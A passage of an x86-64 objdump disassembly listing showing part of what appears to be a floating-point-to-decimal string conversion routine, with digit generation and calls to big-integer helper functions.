  408398:	f2 0f 5c d1          	subsd  %xmm1,%xmm2
  40839c:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  4083a0:	0f 87 d1 fa ff ff    	ja     0x407e77
  4083a6:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  4083ad:	83 c2 01             	add    $0x1,%edx
  4083b0:	39 c2                	cmp    %eax,%edx
  4083b2:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  4083b9:	0f 8d bb 01 00 00    	jge    0x40857a
  4083bf:	f2 0f 10 1d b9 56 15 	movsd  0x1556b9(%rip),%xmm3        # 0x55da80
  4083c6:	00 
  4083c7:	eb 32                	jmp    0x4083fb
  4083c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4083d0:	66 0f 28 d5          	movapd %xmm5,%xmm2
  4083d4:	f2 0f 5c d1          	subsd  %xmm1,%xmm2
  4083d8:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  4083dc:	0f 87 95 fa ff ff    	ja     0x407e77
  4083e2:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  4083e9:	83 c2 01             	add    $0x1,%edx
  4083ec:	39 d0                	cmp    %edx,%eax
  4083ee:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  4083f5:	0f 8e 7f 01 00 00    	jle    0x40857a
  4083fb:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
  4083ff:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
  408403:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  408407:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
  40840b:	83 c2 30             	add    $0x30,%edx
  40840e:	88 16                	mov    %dl,(%rsi)
  408410:	48 83 c6 01          	add    $0x1,%rsi
  408414:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
  408418:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  40841c:	76 b2                	jbe    0x4083d0
  40841e:	66 0f 2e ce          	ucomisd %xmm6,%xmm1
  408422:	45 8d 61 01          	lea    0x1(%r9),%r12d
  408426:	7a 06                	jp     0x40842e
  408428:	0f 84 9d 09 00 00    	je     0x408dcb
  40842e:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  408434:	e9 69 fa ff ff       	jmp    0x407ea2
  408439:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408440:	89 c2                	mov    %eax,%edx
  408442:	4c 89 f1             	mov    %r14,%rcx
  408445:	e8 36 22 00 00       	call   0x40a680
  40844a:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
  408451:	29 44 24 60          	sub    %eax,0x60(%rsp)
  408455:	45 8d 04 04          	lea    (%r12,%rax,1),%r8d
  408459:	e9 35 fb ff ff       	jmp    0x407f93
  40845e:	66 90                	xchg   %ax,%ax
  408460:	48 63 c9             	movslq %ecx,%rcx
  408463:	41 89 56 14          	mov    %edx,0x14(%r14)
  408467:	c1 e2 05             	shl    $0x5,%edx
  40846a:	41 0f bd 44 8e 18    	bsr    0x18(%r14,%rcx,4),%eax
  408470:	83 f0 1f             	xor    $0x1f,%eax
  408473:	29 c2                	sub    %eax,%edx
  408475:	89 54 24 60          	mov    %edx,0x60(%rsp)
  408479:	e9 fb fa ff ff       	jmp    0x407f79
  40847e:	66 90                	xchg   %ax,%ax
  408480:	c7 84 24 30 01 00 00 	movl   $0x0,0x130(%rsp)
  408487:	00 00 00 00 
  40848b:	05 fe 03 00 00       	add    $0x3fe,%eax
  408490:	3d f7 07 00 00       	cmp    $0x7f7,%eax
  408495:	0f 96 c0             	setbe  %al
  408498:	e9 2a fd ff ff       	jmp    0x4081c7
  40849d:	0f 1f 00             	nopl   (%rax)
  4084a0:	83 bc 24 30 01 00 00 	cmpl   $0x4,0x130(%rsp)
  4084a7:	04 
  4084a8:	0f 84 e2 06 00 00    	je     0x408b90
  4084ae:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  4084b5:	05 
  4084b6:	0f 85 2d fd ff ff    	jne    0x4081e9
  4084bc:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  4084c3:	01 00 00 00 
  4084c7:	8b 8c 24 38 01 00 00 	mov    0x138(%rsp),%ecx
  4084ce:	03 4c 24 68          	add    0x68(%rsp),%ecx
  4084d2:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
  4084d9:	83 c1 01             	add    $0x1,%ecx
  4084dc:	85 c9                	test   %ecx,%ecx
  4084de:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  4084e5:	0f 8e 1f 09 00 00    	jle    0x408e0a
  4084eb:	83 f9 0e             	cmp    $0xe,%ecx
  4084ee:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  4084f5:	0f 96 c2             	setbe  %dl
  4084f8:	21 c2                	and    %eax,%edx
  4084fa:	e9 33 fd ff ff       	jmp    0x408232
  4084ff:	90                   	nop
  408500:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  408507:	00 00 00 00 
  40850b:	e9 4d fc ff ff       	jmp    0x40815d
  408510:	66 0f 28 c4          	movapd %xmm4,%xmm0
  408514:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
  408518:	f2 0f 58 05 70 55 15 	addsd  0x155570(%rip),%xmm0        # 0x55da90
  40851f:	00 
  408520:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  408526:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  40852b:	4c 89 d0             	mov    %r10,%rax
  40852e:	41 83 e2 ff          	and    $0xffffffff,%r10d
  408532:	48 c1 e8 20          	shr    $0x20,%rax
  408536:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  40853c:	48 c1 e0 20          	shl    $0x20,%rax
  408540:	49 09 c2             	or     %rax,%r10
  408543:	66 0f 28 c4          	movapd %xmm4,%xmm0
  408547:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  40854c:	f2 0f 10 4c 24 28    	movsd  0x28(%rsp),%xmm1
  408552:	f2 0f 5c 05 3e 55 15 	subsd  0x15553e(%rip),%xmm0        # 0x55da98
  408559:	00 
  40855a:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  40855e:	0f 87 05 09 00 00    	ja     0x408e69
  408564:	f2 0f 10 15 34 55 15 	movsd  0x155534(%rip),%xmm2        # 0x55daa0
  40856b:	00 
  40856c:	66 0f 57 ca          	xorpd  %xmm2,%xmm1
  408570:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  408574:	0f 87 17 03 00 00    	ja     0x408891
  40857a:	f2 0f 11 64 24 28    	movsd  %xmm4,0x28(%rsp)
  408580:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  408585:	45 85 c0             	test   %r8d,%r8d
  408588:	0f 88 c2 00 00 00    	js     0x408650
  40858e:	8b 44 24 68          	mov    0x68(%rsp),%eax
  408592:	3b 47 14             	cmp    0x14(%rdi),%eax
  408595:	0f 8f b5 00 00 00    	jg     0x408650
  40859b:	8b bc 24 88 00 00 00 	mov    0x88(%rsp),%edi
  4085a2:	48 63 d0             	movslq %eax,%rdx
  4085a5:	48 8d 05 54 55 15 00 	lea    0x155554(%rip),%rax        # 0x55db00
  4085ac:	f2 0f 10 14 d0       	movsd  (%rax,%rdx,8),%xmm2
  4085b1:	85 ff                	test   %edi,%edi
  4085b3:	0f 8f 4c 07 00 00    	jg     0x408d05
  4085b9:	8b 84 24 38 01 00 00 	mov    0x138(%rsp),%eax
  4085c0:	c1 e8 1f             	shr    $0x1f,%eax
  4085c3:	84 c0                	test   %al,%al
  4085c5:	0f 84 3a 07 00 00    	je     0x408d05
  4085cb:	8b b4 24 88 00 00 00 	mov    0x88(%rsp),%esi
  4085d2:	85 f6                	test   %esi,%esi
  4085d4:	0f 85 b7 02 00 00    	jne    0x408891
  4085da:	f2 0f 59 15 b6 54 15 	mulsd  0x1554b6(%rip),%xmm2        # 0x55da98
  4085e1:	00 
  4085e2:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  4085e7:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  4085ed:	66 0f 2e d0          	ucomisd %xmm0,%xmm2
  4085f1:	0f 83 9a 02 00 00    	jae    0x408891
  4085f7:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  4085fc:	31 ed                	xor    %ebp,%ebp
  4085fe:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  408605:	00 00 
  408607:	41 83 c4 02          	add    $0x2,%r12d
  40860b:	49 8d 77 01          	lea    0x1(%r15),%rsi
  40860f:	41 c6 07 31          	movb   $0x31,(%r15)
  408613:	31 ff                	xor    %edi,%edi
  408615:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  40861b:	48 89 e9             	mov    %rbp,%rcx
  40861e:	e8 0d 18 00 00       	call   0x409e30
  408623:	48 83 7c 24 78 00    	cmpq   $0x0,0x78(%rsp)
  408629:	0f 84 73 f8 ff ff    	je     0x407ea2
  40862f:	48 3b 7c 24 78       	cmp    0x78(%rsp),%rdi
  408634:	0f 85 29 05 00 00    	jne    0x408b63
  40863a:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  40863f:	e8 ec 17 00 00       	call   0x409e30
  408644:	e9 59 f8 ff ff       	jmp    0x407ea2
  408649:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408650:	44 8b 8c 24 98 00 00 	mov    0x98(%rsp),%r9d
  408657:	00 
  408658:	45 85 c9             	test   %r9d,%r9d
  40865b:	0f 84 c3 02 00 00    	je     0x408924
  408661:	2b 6c 24 60          	sub    0x60(%rsp),%ebp
  408665:	8b 57 04             	mov    0x4(%rdi),%edx
  408668:	44 89 c1             	mov    %r8d,%ecx
  40866b:	8d 45 01             	lea    0x1(%rbp),%eax
  40866e:	29 e9                	sub    %ebp,%ecx
  408670:	39 d1                	cmp    %edx,%ecx
  408672:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  408679:	0f 8d 61 04 00 00    	jge    0x408ae0
  40867f:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  408686:	05 
  408687:	0f 84 53 04 00 00    	je     0x408ae0
  40868d:	83 bc 24 30 01 00 00 	cmpl   $0x3,0x130(%rsp)
  408694:	03 
  408695:	0f 84 45 04 00 00    	je     0x408ae0
  40869b:	41 29 d0             	sub    %edx,%r8d
  40869e:	41 8d 40 01          	lea    0x1(%r8),%eax
  4086a2:	44 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8d
  4086a9:	00 
  4086aa:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  4086b1:	45 85 c0             	test   %r8d,%r8d
  4086b4:	7e 17                	jle    0x4086cd
  4086b6:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  4086bd:	01 
  4086be:	7e 0d                	jle    0x4086cd
  4086c0:	39 84 24 88 00 00 00 	cmp    %eax,0x88(%rsp)
  4086c7:	0f 8c 21 04 00 00    	jl     0x408aee
  4086cd:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  4086d4:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  4086db:	b9 01 00 00 00       	mov    $0x1,%ecx
  4086e0:	01 84 24 80 00 00 00 	add    %eax,0x80(%rsp)
  4086e7:	01 44 24 70          	add    %eax,0x70(%rsp)
  4086eb:	e8 50 18 00 00       	call   0x409f40
  4086f0:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  4086f5:	8b 54 24 70          	mov    0x70(%rsp),%edx
  4086f9:	85 d2                	test   %edx,%edx
  4086fb:	7e 23                	jle    0x408720
  4086fd:	85 f6                	test   %esi,%esi
  4086ff:	7e 1f                	jle    0x408720
  408701:	39 74 24 70          	cmp    %esi,0x70(%rsp)
  408705:	8b 44 24 70          	mov    0x70(%rsp),%eax
  408709:	0f 4f c6             	cmovg  %esi,%eax
  40870c:	29 84 24 80 00 00 00 	sub    %eax,0x80(%rsp)
  408713:	29 44 24 70          	sub    %eax,0x70(%rsp)
  408717:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  40871e:	29 c6                	sub    %eax,%esi
  408720:	8b 84 24 8c 00 00 00 	mov    0x8c(%rsp),%eax
  408727:	85 c0                	test   %eax,%eax
  408729:	7e 53                	jle    0x40877e
  40872b:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
  408732:	85 c0                	test   %eax,%eax
  408734:	0f 84 12 04 00 00    	je     0x408b4c
  40873a:	85 ed                	test   %ebp,%ebp
  40873c:	7e 31                	jle    0x40876f
  40873e:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  408743:	89 ea                	mov    %ebp,%edx
  408745:	e8 46 19 00 00       	call   0x40a090
  40874a:	4c 89 f2             	mov    %r14,%rdx
  40874d:	48 89 c1             	mov    %rax,%rcx
  408750:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  408755:	e8 16 18 00 00       	call   0x409f70
  40875a:	4c 89 f1             	mov    %r14,%rcx
  40875d:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
  408762:	e8 c9 16 00 00       	call   0x409e30
  408767:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
  40876c:	49 89 c6             	mov    %rax,%r14
  40876f:	8b 94 24 8c 00 00 00 	mov    0x8c(%rsp),%edx
  408776:	29 ea                	sub    %ebp,%edx
  408778:	0f 85 d5 03 00 00    	jne    0x408b53
  40877e:	b9 01 00 00 00       	mov    $0x1,%ecx
  408783:	e8 b8 17 00 00       	call   0x409f40
  408788:	48 89 c5             	mov    %rax,%rbp
  40878b:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  408792:	85 c0                	test   %eax,%eax
  408794:	7e 12                	jle    0x4087a8
  408796:	8b 94 24 90 00 00 00 	mov    0x90(%rsp),%edx
  40879d:	48 89 e9             	mov    %rbp,%rcx
  4087a0:	e8 eb 18 00 00       	call   0x40a090
  4087a5:	48 89 c5             	mov    %rax,%rbp
  4087a8:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  4087af:	01 
  4087b0:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  4087b7:	00 00 00 00 
  4087bb:	0f 8e 12 06 00 00    	jle    0x408dd3
  4087c1:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  4087c8:	bf 1f 00 00 00       	mov    $0x1f,%edi
  4087cd:	85 c0                	test   %eax,%eax
  4087cf:	74 10                	je     0x4087e1
  4087d1:	8b 45 14             	mov    0x14(%rbp),%eax
  4087d4:	83 e8 01             	sub    $0x1,%eax
  4087d7:	48 98                	cltq
  4087d9:	0f bd 7c 85 18       	bsr    0x18(%rbp,%rax,4),%edi
  4087de:	83 f7 1f             	xor    $0x1f,%edi
  4087e1:	2b 7c 24 70          	sub    0x70(%rsp),%edi
  4087e5:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
  4087ec:	83 ef 04             	sub    $0x4,%edi
  4087ef:	83 e7 1f             	and    $0x1f,%edi
  4087f2:	01 fa                	add    %edi,%edx
  4087f4:	89 bc 24 ac 00 00 00 	mov    %edi,0xac(%rsp)
  4087fb:	89 f8                	mov    %edi,%eax
  4087fd:	85 d2                	test   %edx,%edx
  4087ff:	7e 12                	jle    0x408813
  408801:	4c 89 f1             	mov    %r14,%rcx
  408804:	e8 c7 19 00 00       	call   0x40a1d0
  408809:	49 89 c6             	mov    %rax,%r14
  40880c:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
  408813:	8b 54 24 70          	mov    0x70(%rsp),%edx
  408817:	01 c2                	add    %eax,%edx
  408819:	85 d2                	test   %edx,%edx
  40881b:	7e 0b                	jle    0x408828
  40881d:	48 89 e9             	mov    %rbp,%rcx
  408820:	e8 ab 19 00 00       	call   0x40a1d0
  408825:	48 89 c5             	mov    %rax,%rbp
  408828:	8b 84 24 94 00 00 00 	mov    0x94(%rsp),%eax
  40882f:	85 c0                	test   %eax,%eax
  408831:	0f 85 bb 03 00 00    	jne    0x408bf2
  408837:	44 8b a4 24 88 00 00 	mov    0x88(%rsp),%r12d
  40883e:	00 
  40883f:	45 85 e4             	test   %r12d,%r12d
  408842:	0f 8f f8 00 00 00    	jg     0x408940
  408848:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  40884f:	02 
  408850:	0f 8e ea 00 00 00    	jle    0x408940
  408856:	8b b4 24 88 00 00 00 	mov    0x88(%rsp),%esi
  40885d:	85 f6                	test   %esi,%esi
  40885f:	75 3b                	jne    0x40889c
  408861:	45 31 c0             	xor    %r8d,%r8d
  408864:	48 89 e9             	mov    %rbp,%rcx
  408867:	ba 05 00 00 00       	mov    $0x5,%edx
  40886c:	e8 1f 16 00 00       	call   0x409e90
  408871:	4c 89 f1             	mov    %r14,%rcx
  408874:	48 89 c2             	mov    %rax,%rdx
  408877:	48 89 c5             	mov    %rax,%rbp
  40887a:	e8 51 1a 00 00       	call   0x40a2d0
  40887f:	85 c0                	test   %eax,%eax
  408881:	7e 19                	jle    0x40889c
  408883:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408888:	41 83 c4 02          	add    $0x2,%r12d
  40888c:	e9 7a fd ff ff       	jmp    0x40860b
  408891:	31 ed                	xor    %ebp,%ebp
  408893:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  40889a:	00 00 
  40889c:	44 8b a4 24 38 01 00 	mov    0x138(%rsp),%r12d
  4088a3:	00 
  4088a4:	4c 89 fe             	mov    %r15,%rsi
  4088a7:	31 ff                	xor    %edi,%edi
  4088a9:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  4088af:	41 f7 dc             	neg    %r12d
  4088b2:	e9 64 fd ff ff       	jmp    0x40861b
  4088b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4088be:	00 00 
  4088c0:	f7 da                	neg    %edx
  4088c2:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
  4088c9:	00 
  4088ca:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
  4088d1:	e9 a5 f8 ff ff       	jmp    0x40817b
  4088d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4088dd:	00 00 00 
  4088e0:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
  4088e4:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  4088e8:	7a 06                	jp     0x4088f0
  4088ea:	0f 84 10 f8 ff ff    	je     0x408100
  4088f0:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  4088f5:	e9 06 f8 ff ff       	jmp    0x408100
  4088fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  408900:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
  408904:	29 8c 24 80 00 00 00 	sub    %ecx,0x80(%rsp)
  40890b:	c7 84 24 90 00 00 00 	movl   $0x0,0x90(%rsp)
  408912:	00 00 00 00 
  408916:	f7 d9                	neg    %ecx
  408918:	89 8c 24 8c 00 00 00 	mov    %ecx,0x8c(%rsp)
  40891f:	e9 7d f8 ff ff       	jmp    0x4081a1
  408924:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  40892b:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  408932:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  408939:	00 00 
  40893b:	e9 b5 fd ff ff       	jmp    0x4086f5
  408940:	44 8b 9c 24 98 00 00 	mov    0x98(%rsp),%r11d
  408947:	00 
  408948:	45 85 db             	test   %r11d,%r11d
  40894b:	0f 84 01 03 00 00    	je     0x408c52
  408951:	8d 14 3e             	lea    (%rsi,%rdi,1),%edx
  408954:	85 d2                	test   %edx,%edx
  408956:	7e 0f                	jle    0x408967
  408958:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  40895d:	e8 6e 18 00 00       	call   0x40a1d0
  408962:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  408967:	44 8b 94 24 8c 00 00 	mov    0x8c(%rsp),%r10d
  40896e:	00 
  40896f:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
  408974:	45 85 d2             	test   %r10d,%r10d
  408977:	0f 85 2e 07 00 00    	jne    0x4090ab
  40897d:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
  408984:	00 
  408985:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  40898c:	01 00 00 00 
  408990:	4c 89 fe             	mov    %r15,%rsi
  408993:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
  408998:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
  40899d:	4c 89 cb             	mov    %r9,%rbx
  4089a0:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
  4089a5:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
  4089aa:	e9 ba 00 00 00       	jmp    0x408a69
  4089af:	90                   	nop
  4089b0:	4c 89 c1             	mov    %r8,%rcx
  4089b3:	e8 78 14 00 00       	call   0x409e30
  4089b8:	8b 8c 24 30 01 00 00 	mov    0x130(%rsp),%ecx
  4089bf:	09 e9                	or     %ebp,%ecx
  4089c1:	75 18                	jne    0x4089db
  4089c3:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
  4089c8:	f6 00 01             	testb  $0x1,(%rax)
  4089cb:	75 0e                	jne    0x4089db
  4089cd:	44 8b 44 24 6c       	mov    0x6c(%rsp),%r8d
  4089d2:	45 85 c0             	test   %r8d,%r8d
  4089d5:	0f 84 00 09 00 00    	je     0x4092db
  4089db:	45 85 ed             	test   %r13d,%r13d
  4089de:	0f 88 75 05 00 00    	js     0x408f59
  4089e4:	44 0b ac 24 30 01 00 	or     0x130(%rsp),%r13d
  4089eb:	00 
  4089ec:	75 0e                	jne    0x4089fc
  4089ee:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
  4089f3:	f6 02 01             	testb  $0x1,(%rdx)
  4089f6:	0f 84 5d 05 00 00    	je     0x408f59
  4089fc:	85 ed                	test   %ebp,%ebp
  4089fe:	0f 8f e6 06 00 00    	jg     0x4090ea
  408a04:	44 88 26             	mov    %r12b,(%rsi)
  408a07:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  408a0e:	48 83 c6 01          	add    $0x1,%rsi
  408a12:	39 8c 24 ac 00 00 00 	cmp    %ecx,0xac(%rsp)
  408a19:	0f 84 4c 07 00 00    	je     0x40916b
  408a1f:	45 31 c0             	xor    %r8d,%r8d
  408a22:	4c 89 f1             	mov    %r14,%rcx
  408a25:	ba 0a 00 00 00       	mov    $0xa,%edx
  408a2a:	e8 61 14 00 00       	call   0x409e90
  408a2f:	45 31 c0             	xor    %r8d,%r8d
  408a32:	48 39 df             	cmp    %rbx,%rdi
  408a35:	49 89 c6             	mov    %rax,%r14
  408a38:	ba 0a 00 00 00       	mov    $0xa,%edx
  408a3d:	48 89 f9             	mov    %rdi,%rcx
  408a40:	0f 84 8a 00 00 00    	je     0x408ad0
  408a46:	e8 45 14 00 00       	call   0x409e90
  408a4b:	48 89 d9             	mov    %rbx,%rcx
  408a4e:	45 31 c0             	xor    %r8d,%r8d
  408a51:	ba 0a 00 00 00       	mov    $0xa,%edx
  408a56:	48 89 c7             	mov    %rax,%rdi
  408a59:	e8 32 14 00 00       	call   0x409e90
  408a5e:	48 89 c3             	mov    %rax,%rbx
  408a61:	83 84 24 ac 00 00 00 	addl   $0x1,0xac(%rsp)
  408a68:	01 
  408a69:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
  408a6e:	4c 89 f1             	mov    %r14,%rcx
  408a71:	bd 01 00 00 00       	mov    $0x1,%ebp
  408a76:	e8 35 0f 00 00       	call   0x4099b0
  408a7b:	48 89 fa             	mov    %rdi,%rdx
  408a7e:	4c 89 f1             	mov    %r14,%rcx
  408a81:	41 89 c7             	mov    %eax,%r15d
  408a84:	44 8d 60 30          	lea    0x30(%rax),%r12d
  408a88:	e8 43 18 00 00       	call   0x40a2d0
  408a8d:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
  408a92:	48 89 da             	mov    %rbx,%rdx
  408a95:	41 89 c5             	mov    %eax,%r13d
  408a98:	e8 83 18 00 00       	call   0x40a320
  408a9d:	44 8b 48 10          	mov    0x10(%rax),%r9d
  408aa1:	49 89 c0             	mov    %rax,%r8
  408aa4:	45 85 c9             	test   %r9d,%r9d
  408aa7:	0f 85 03 ff ff ff    	jne    0x4089b0
  408aad:	48 89 c2             	mov    %rax,%rdx
  408ab0:	4c 89 f1             	mov    %r14,%rcx
  408ab3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  408ab8:	e8 13 18 00 00       	call   0x40a2d0
  408abd:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
  408ac2:	89 c5                	mov    %eax,%ebp
  408ac4:	e9 e7 fe ff ff       	jmp    0x4089b0
  408ac9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408ad0:	e8 bb 13 00 00       	call   0x409e90
  408ad5:	48 89 c7             	mov    %rax,%rdi
  408ad8:	48 89 c3             	mov    %rax,%rbx
  408adb:	eb 84                	jmp    0x408a61
  408add:	0f 1f 00             	nopl   (%rax)
  408ae0:	83 bc 24 30 01 00 00 	cmpl   $0x1,0x130(%rsp)
  408ae7:	01 
  408ae8:	0f 8e df fb ff ff    	jle    0x4086cd
  408aee:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  408af5:	8b ac 24 8c 00 00 00 	mov    0x8c(%rsp),%ebp
  408afc:	83 e8 01             	sub    $0x1,%eax
  408aff:	29 c5                	sub    %eax,%ebp
  408b01:	39 84 24 8c 00 00 00 	cmp    %eax,0x8c(%rsp)
  408b08:	7d 19                	jge    0x408b23
  408b0a:	89 c2                	mov    %eax,%edx
  408b0c:	2b 94 24 8c 00 00 00 	sub    0x8c(%rsp),%edx
  408b13:	31 ed                	xor    %ebp,%ebp
  408b15:	01 94 24 90 00 00 00 	add    %edx,0x90(%rsp)
  408b1c:	89 84 24 8c 00 00 00 	mov    %eax,0x8c(%rsp)
  408b23:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  408b2a:	85 c9                	test   %ecx,%ecx
  408b2c:	0f 88 59 05 00 00    	js     0x40908b
  408b32:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  408b39:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  408b40:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  408b47:	e9 8f fb ff ff       	jmp    0x4086db
  408b4c:	8b 94 24 8c 00 00 00 	mov    0x8c(%rsp),%edx
  408b53:	4c 89 f1             	mov    %r14,%rcx
  408b56:	e8 35 15 00 00       	call   0x40a090
  408b5b:	49 89 c6             	mov    %rax,%r14
  408b5e:	e9 1b fc ff ff       	jmp    0x40877e
  408b63:	48 85 ff             	test   %rdi,%rdi
  408b66:	0f 84 ce fa ff ff    	je     0x40863a
  408b6c:	48 89 f9             	mov    %rdi,%rcx
  408b6f:	e8 bc 12 00 00       	call   0x409e30
  408b74:	e9 c1 fa ff ff       	jmp    0x40863a
  408b79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408b80:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
  408b87:	00 00 00 00 
  408b8b:	e9 37 f9 ff ff       	jmp    0x4084c7
  408b90:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  408b97:	01 00 00 00 
  408b9b:	44 8b bc 24 38 01 00 	mov    0x138(%rsp),%r15d
  408ba2:	00 
  408ba3:	45 85 ff             	test   %r15d,%r15d
  408ba6:	0f 8e 80 02 00 00    	jle    0x408e2c
  408bac:	83 bc 24 38 01 00 00 	cmpl   $0xe,0x138(%rsp)
  408bb3:	0e 
  408bb4:	41 0f 96 c7          	setbe  %r15b
  408bb8:	8b 94 24 38 01 00 00 	mov    0x138(%rsp),%edx
  408bbf:	8b 8c 24 38 01 00 00 	mov    0x138(%rsp),%ecx
  408bc6:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  408bcd:	44 89 fa             	mov    %r15d,%edx
  408bd0:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
  408bd7:	21 c2                	and    %eax,%edx
  408bd9:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  408be0:	e9 4d f6 ff ff       	jmp    0x408232
  408be5:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
  408bec:	00 00 00 00 
  408bf0:	eb a9                	jmp    0x408b9b
  408bf2:	48 89 ea             	mov    %rbp,%rdx
  408bf5:	4c 89 f1             	mov    %r14,%rcx
  408bf8:	e8 d3 16 00 00       	call   0x40a2d0
  408bfd:	85 c0                	test   %eax,%eax
  408bff:	0f 89 32 fc ff ff    	jns    0x408837
  408c05:	45 31 c0             	xor    %r8d,%r8d
  408c08:	4c 89 f1             	mov    %r14,%rcx
  408c0b:	ba 0a 00 00 00       	mov    $0xa,%edx
  408c10:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  408c15:	e8 76 12 00 00       	call   0x409e90
  408c1a:	49 89 c6             	mov    %rax,%r14
  408c1d:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
  408c24:	85 c0                	test   %eax,%eax
  408c26:	0f 85 e5 06 00 00    	jne    0x409311
  408c2c:	83 bc 24 9c 00 00 00 	cmpl   $0x0,0x9c(%rsp)
  408c33:	00 
  408c34:	7f 0e                	jg     0x408c44
